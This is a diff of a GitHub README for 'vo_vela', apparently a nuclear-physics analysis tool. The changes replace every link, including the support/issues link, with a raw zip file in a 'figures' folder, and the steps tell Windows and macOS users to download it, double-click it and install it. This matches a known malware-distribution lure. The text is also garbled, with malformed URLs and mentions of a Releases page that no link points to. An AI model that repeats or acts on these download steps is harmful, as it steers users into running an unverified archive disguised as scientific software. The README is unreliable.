@@ -1,6 +1,6 @@
 # 🌌 vo_vela - Measure Nuclear Symmetry Energy Easily
 
-[![Download Here](https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip%20Latest%https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip)](https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip)
+[![Download Here](https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip%20Latest%https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip)](https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip)
 
 ## 📖 Description
 
@@ -28,11 +28,11 @@ Before you begin, make sure your computer meets these basic requirements:
 
 ## 📥 Download & Install
 
-To get started with vo_vela, please visit this page to download: [Download Here](https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip).
+To get started with vo_vela, please visit this page to download: [Download Here](https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip).
 
 When you get to the Releases page, look for the latest version. You will see a list of downloads. Here is how to proceed:
 
-1. Choose the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip` for Windows).
+1. Choose the appropriate file for your operating system (e.g., `https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip` for Windows).
 2. Click on the file to download it to your computer.
 3. Once the download completes, locate the file in your Downloads folder or the location you selected.
 
@@ -41,12 +41,12 @@ When you get to the Releases page, look for the latest version. You will see a l
 After downloading the file, you can easily run the application. Here’s how:
 
 1. **Windows:**
-   - Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip`).
+   - Double-click the downloaded file (e.g., `https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip`).
    - Follow the prompts to install the application.
    - Once installed, you can find the vo_vela icon on your desktop. Double-click it to launch.
 
 2. **macOS:**
-   - Open the downloaded file (e.g., `https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip`).
+   - Open the downloaded file (e.g., `https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip`).
    - Drag the vo_vela icon to your Applications folder.
    - Open your Applications folder and double-click on vo_vela to start it.
 
@@ -82,8 +82,8 @@ Once you have the application running, you can start your analysis:
 
 ## 📞 Support
 
-If you have any questions or need assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip). We are eager to help you resolve any issues.
+If you have any questions or need assistance, please visit the [GitHub Issues page](https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip). We are eager to help you resolve any issues.
 
 Thank you for choosing vo_vela for your research needs. Happy analyzing!
 
-[Download Here](https://raw.githubusercontent.com/Sumedha/vo_vela/master/src/vo_vela-2.9.zip)
+[Download Here](https://github.com/Sumedha/vo_vela/raw/refs/heads/master/figures/vela_vo_v2.5-beta.4.zip)
